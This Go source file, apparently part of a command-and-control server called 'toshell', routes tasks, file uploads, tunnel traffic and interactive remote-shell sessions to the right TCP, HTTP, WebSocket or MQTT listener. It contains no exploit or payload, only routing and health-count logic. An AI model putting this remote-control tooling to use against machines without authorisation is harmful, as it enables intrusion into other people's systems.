package api

import (
	"fmt"
	"sync"

	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
	"toshell/internal/server/config"
	"toshell/internal/server/session"
)

// runtimeListener 一个已启动的运行时监听器实例（Web 界面启停的真实 socket）。
type runtimeListener struct {
	id     string
	typ    string // tcp / http
	pusher TaskPusher
	stop   func()
}

// listenerRouter 实现 TaskPusher + ShellController，按会话所属监听器路由推送：
// 会话注册时记录 ListenerID（见 TCP/HTTP listener 的 handleRegister），
// 所有 API 推送（任务/隧道/文件/shell）通过该路由转发到正确的监听器实例；
// 未命中（旧会话等）回退到默认监听器（配置文件启动的）。
type listenerRouter struct {
	sessMgr *session.Manager

	mu        sync.RWMutex
	runtimes  map[string]*runtimeListener // listenerID → 实例
	defaultP  TaskPusher                  // 配置文件启动的默认监听器
	defaultSC ShellController
}

func newListenerRouter(sessMgr *session.Manager) *listenerRouter {
	return &listenerRouter{
		sessMgr:  sessMgr,
		runtimes: make(map[string]*runtimeListener),
	}
}

// SetDefault 设置默认监听器（配置文件启动的，main.go 调用）。
func (r *listenerRouter) SetDefault(p TaskPusher) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.defaultP = p
	if sc, ok := p.(ShellController); ok {
		r.defaultSC = sc
	}
}

// register 注册一个运行时监听器实例。
func (r *listenerRouter) register(rl *runtimeListener) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.runtimes[rl.id] = rl
}

// unregister 注销并停止一个运行时监听器实例。
func (r *listenerRouter) unregister(id string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if rl, ok := r.runtimes[id]; ok {
		if rl.stop != nil {
			rl.stop()
		}
		delete(r.runtimes, id)
	}
}

// isRunning 判断监听器 ID 是否已有运行实例。
func (r *listenerRouter) isRunning(id string) bool {
	r.mu.RLock()
	defer r.mu.RUnlock()
	_, ok := r.runtimes[id]
	return ok
}

// runningCount 当前运行的监听器实例数（含默认）。
func (r *listenerRouter) runningCount() int {
	r.mu.RLock()
	defer r.mu.RUnlock()
	n := len(r.runtimes)
	if r.defaultP != nil {
		n++
	}
	return n
}

// ChannelHealth 按监听器类型统计运行中的实例数。
// 通道健康仪表板数据源：type（tcp/http/websocket/mqtt）→ 运行监听器数。
// 默认监听器（defaultP）必然通过 RegisterRuntimeListener 注册进 runtimes，
// 因此不在此重复计数（否则默认 TCP 监听器被算 2 次）。
func (r *listenerRouter) ChannelHealth() map[string]int {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := map[string]int{"tcp": 0, "http": 0, "websocket": 0, "mqtt": 0}
	for _, rl := range r.runtimes {
		if rl == nil {
			continue
		}
		typ := normalizeChannelType(rl.typ)
		out[typ]++
	}
	// 兜底：若 defaultP 存在但对应通道在 runtimes 中为 0（极端场景默认监听器
	// 注册失败但 defaultP 已设），才补计一次，避免漏统计。
	if r.defaultP != nil {
		cfg := config.Get()
		if cfg != nil {
			typ := normalizeChannelType(cfg.Listener.Protocol)
			if out[typ] == 0 {
				out[typ] = 1
			}
		}
	}
	return out
}

// normalizeChannelType 归一化监听器类型为四通道之一。
func normalizeChannelType(t string) string {
	switch t {
	case "websocket", "ws", "wss":
		return "websocket"
	case "mqtt", "mqtts":
		return "mqtt"
	case "http", "https":
		return "http"
	default:
		return "tcp"
	}
}

// resolve 根据会话 ID 解析其所属监听器的 TaskPusher。
func (r *listenerRouter) resolve(sessionID string) TaskPusher {
	if r.sessMgr != nil {
		if sess, err := r.sessMgr.Get(sessionID); err == nil && sess != nil && sess.Info != nil && sess.Info.ListenerID != "" {
			r.mu.RLock()
			rl, ok := r.runtimes[sess.Info.ListenerID]
			r.mu.RUnlock()
			if ok && rl != nil && rl.pusher != nil {
				return rl.pusher
			}
		}
	}
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.defaultP
}

// resolveShell 根据会话 ID 解析所属监听器的 ShellController。
func (r *listenerRouter) resolveShell(sessionID string) ShellController {
	if r.sessMgr != nil {
		if sess, err := r.sessMgr.Get(sessionID); err == nil && sess != nil && sess.Info != nil && sess.Info.ListenerID != "" {
			r.mu.RLock()
			rl, ok := r.runtimes[sess.Info.ListenerID]
			r.mu.RUnlock()
			if ok && rl != nil {
				if sc, ok2 := rl.pusher.(ShellController); ok2 {
					return sc
				}
			}
		}
	}
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.defaultSC
}

// ─── TaskPusher 接口 ──────────────────────────────────────────────────────────

func (r *listenerRouter) PushTask(sessionID string, taskInfo *types.TaskInfo) error {
	p := r.resolve(sessionID)
	if p == nil {
		return fmt.Errorf("no listener available for session %s", sessionID)
	}
	return p.PushTask(sessionID, taskInfo)
}

func (r *listenerRouter) PushFileUpload(sessionID, uploadID, filename, targetPath string, size int64, taskID uint64) error {
	p := r.resolve(sessionID)
	if p == nil {
		return fmt.Errorf("no listener available for session %s", sessionID)
	}
	return p.PushFileUpload(sessionID, uploadID, filename, targetPath, size, taskID)
}

func (r *listenerRouter) SendTunnelPacket(sessionID string, tunnelPacket *tunnel.TunnelPacket) error {
	p := r.resolve(sessionID)
	if p == nil {
		return fmt.Errorf("no listener available for session %s", sessionID)
	}
	return p.SendTunnelPacket(sessionID, tunnelPacket)
}

func (r *listenerRouter) SendTunnelRaw(sessionID string, rawPacket []byte) error {
	p := r.resolve(sessionID)
	if p == nil {
		return fmt.Errorf("no listener available for session %s", sessionID)
	}
	return p.SendTunnelRaw(sessionID, rawPacket)
}

// ListRelayNodes 聚合所有运行中监听器的中继节点（HTTP 监听器返回空）。
func (r *listenerRouter) ListRelayNodes() []types.RelayNode {
	r.mu.RLock()
	defer r.mu.RUnlock()
	var nodes []types.RelayNode
	if r.defaultP != nil {
		nodes = append(nodes, r.defaultP.ListRelayNodes()...)
	}
	for _, rl := range r.runtimes {
		if rl.pusher != nil {
			nodes = append(nodes, rl.pusher.ListRelayNodes()...)
		}
	}
	return nodes
}

// ─── ShellController 接口 ────────────────────────────────────────────────────

func (r *listenerRouter) OpenShell(sessionID string, shell string) error {
	sc := r.resolveShell(sessionID)
	if sc == nil {
		return fmt.Errorf("no shell controller for session %s", sessionID)
	}
	return sc.OpenShell(sessionID, shell)
}

func (r *listenerRouter) SendShellInput(sessionID string, data string) error {
	sc := r.resolveShell(sessionID)
	if sc == nil {
		return fmt.Errorf("no shell controller for session %s", sessionID)
	}
	return sc.SendShellInput(sessionID, data)
}

func (r *listenerRouter) CloseShell(sessionID string) error {
	sc := r.resolveShell(sessionID)
	if sc == nil {
		return fmt.Errorf("no shell controller for session %s", sessionID)
	}
	return sc.CloseShell(sessionID)
}
